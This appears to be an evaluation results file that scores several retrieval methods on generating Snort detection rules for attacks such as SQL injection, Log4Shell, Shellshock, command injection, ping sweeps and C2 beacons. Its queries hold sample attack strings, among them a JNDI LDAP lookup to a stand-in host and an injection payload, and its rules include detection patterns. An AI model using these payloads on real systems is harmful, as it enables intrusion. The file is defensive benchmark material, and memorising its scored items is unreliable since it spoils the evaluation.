Q_014,rag_hybrid,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,multi_hop,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,graph_rag,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0046;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_014,agentic_rag,Create a rule for suspicious PowerShell download cradle content.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0131,SNORT_0097;SNORT_0131;SNORT_0063;SNORT_0012;SNORT_0114,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)"
Q_015,baseline,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.375,1.0,SNORT_0072,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,UDP Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_015,rag_classic,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0157;SNORT_0004;SNORT_0089,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,rag_rerank,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0157;SNORT_0089;SNORT_0004,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0004;SNORT_0021;SNORT_0088;SNORT_0139,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,multi_hop,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0089;SNORT_0157;SNORT_0004,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,graph_rag,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0021;SNORT_0157;SNORT_0089;SNORT_0004,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_015,agentic_rag,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0072,SNORT_0072;SNORT_0004;SNORT_0021;SNORT_0088;SNORT_0139,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)"
Q_016,baseline,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0138,,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_016,rag_classic,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0138,SNORT_0087;SNORT_0138;SNORT_0019;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000087; rev:1;)"
Q_016,rag_rerank,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0138,SNORT_0087;SNORT_0138;SNORT_0019;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000087; rev:1;)"
Q_016,rag_hybrid,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0138,SNORT_0138;SNORT_0087;SNORT_0070;SNORT_0019;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)"
Q_016,multi_hop,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0138,SNORT_0138;SNORT_0087;SNORT_0019;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)"
Q_016,graph_rag,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0138,SNORT_0104;SNORT_0121;SNORT_0138;SNORT_0087;SNORT_0070,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_016,agentic_rag,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0138,SNORT_0138;SNORT_0087;SNORT_0070;SNORT_0019;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)"
Q_017,baseline,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0073,,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_017,rag_classic,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0005;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,rag_rerank,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0039;SNORT_0090;SNORT_0005;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,rag_hybrid,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0005;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,multi_hop,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0141;SNORT_0005,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_017,graph_rag,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0073,SNORT_0039;SNORT_0056;SNORT_0005;SNORT_0073;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_017,agentic_rag,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0073,SNORT_0073;SNORT_0090;SNORT_0039;SNORT_0005;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)"
Q_018,baseline,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0151,,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,rag_classic,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0100;SNORT_0066;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,rag_rerank,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,rag_hybrid,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,multi_hop,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,graph_rag,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0101;SNORT_0049;SNORT_0033,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_018,agentic_rag,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0151,SNORT_0032;SNORT_0066;SNORT_0100;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_019,baseline,Rule for command injection on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0144,,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000008; rev:1;)"
Q_019,rag_classic,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,rag_rerank,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,rag_hybrid,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,multi_hop,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0144,SNORT_0144;SNORT_0127;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000144; rev:1;)"
Q_019,graph_rag,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0144,SNORT_0127;SNORT_0144;SNORT_0059;SNORT_0110;SNORT_0008,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)"
Q_019,agentic_rag,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0144,SNORT_0144;SNORT_0127;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000144; rev:1;)"
Q_020,baseline,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,1.0,SNORT_0062,,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_020,rag_classic,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0113;SNORT_0062;SNORT_0011;SNORT_0028,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_020,rag_rerank,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0113;SNORT_0045;SNORT_0062;SNORT_0011;SNORT_0028,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)"
Q_020,rag_hybrid,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0113;SNORT_0062;SNORT_0011;SNORT_0130,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_020,multi_hop,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0062;SNORT_0113;SNORT_0011;SNORT_0130,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_020,graph_rag,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0113;SNORT_0011;SNORT_0045;SNORT_0062;SNORT_0028,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)"
Q_020,agentic_rag,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0113;SNORT_0062;SNORT_0011;SNORT_0130,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_021,baseline,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0152,,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000016; rev:1;)"
Q_021,rag_classic,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0084,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,rag_rerank,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0084,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
